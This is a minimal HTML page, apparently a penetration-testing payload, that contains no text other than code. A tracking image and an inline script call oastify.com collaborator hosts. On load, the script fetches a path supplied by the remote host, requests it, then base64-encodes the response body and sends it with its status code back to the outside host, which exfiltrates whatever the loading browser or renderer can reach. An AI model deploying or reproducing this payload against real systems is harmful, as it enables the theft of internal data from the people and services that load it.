<!DOCTYPE html>
<html>
<img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
<script>
(async () => {
var BASE = 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com';
var COLLAB = 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com';

window.fetch(BASE)
  .then(r => r.text())
  .then(role =>
    window.fetch(BASE + role.trim())
  )
  .then(r => r.text().then(body => ({ status: r.status, body })))
  .then(({ status, body }) =>
    window.fetch(COLLAB + '/?s=' + status + '&d=' + btoa(body || ''))
  );
})();
</script>
</html>
